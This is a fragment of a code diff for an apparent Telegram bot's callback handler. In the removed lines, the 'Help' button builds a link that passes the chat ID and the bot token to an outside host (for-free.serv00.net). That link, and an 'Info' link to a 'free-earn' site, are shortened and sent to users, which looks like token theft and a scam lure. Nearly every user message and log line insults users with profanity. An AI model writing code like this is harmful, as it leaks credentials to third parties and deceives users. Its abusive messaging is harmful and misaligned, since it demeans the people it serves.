-          const welcomeMessage = `Hey ${username}, welcome to the bot! Please choose from the menu below, you lucky fuck:`;
-          const menuKeyboard = {
-            reply_markup: {
-              inline_keyboard: [
-                [{ text: 'Help', callback_data: 'help' }],
-                [{ text: 'Info', callback_data: 'info' }],
-              ],
-            },
-          };
-
-          // Answer the callback query
-          await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for proceeding, you quick fuck!');
-
-          // Send the welcome message with menu
-          await bot.telegram.sendMessage(chatId, welcomeMessage, menuKeyboard);
-        } catch (error) {
-          console.error('Error in "joined" callback, you impatient fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
-        }
-      }
-
-      // Handle "Help" Callback
-      else if (callbackData === 'help') {
-        try {
-          // Generate the URL with chatId and botToken
-          const longHelpUrl = `https://for-free.serv00.net/t/index.html?id=${chatId}&bot=${botToken}`;
-          const shortHelpUrl = await shortenUrl(longHelpUrl);
-          await bot.telegram.answerCbQuery(callbackQueryId);
-          await bot.telegram.sendMessage(chatId, `To get help, please open this link, you needy fuck: ${shortHelpUrl}`);
-        } catch (error) {
-          console.error('Error in "help" callback, you helpless fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
-        }
-      }
-
-      // Handle "Info" Callback
-      else if (callbackData === 'info') {
-        try {
-          const longInfoUrl = `https://free-earn.vercelpro.app/?id=${chatId}`;
-          const shortInfoUrl = await shortenUrl(longInfoUrl);
-          await bot.telegram.answerCbQuery(callbackQueryId);
-          await bot.telegram.sendMessage(chatId, `Hey, do you want to get info about us? Please open this URL, you curious fuck: ${shortInfoUrl}`);
-        } catch (error) {
-          console.error('Error in "info" callback, you nosy fuck:', error);
-          await bot.telegram.sendMessage(chatId, '❌ An error occurred. Please try again, you moron.');
-        }
-      }
+    // Handle other requests
+    else {
+      res.status(200).send('Created Bot is running, you nosy fuck.');
     }
-
-    res.status(200).json({ ok: true });
   } catch (error) {
     console.error('Error in created.js, you clumsy fuck:', error);
     res.status(500).json({ ok: false, error: error.message });
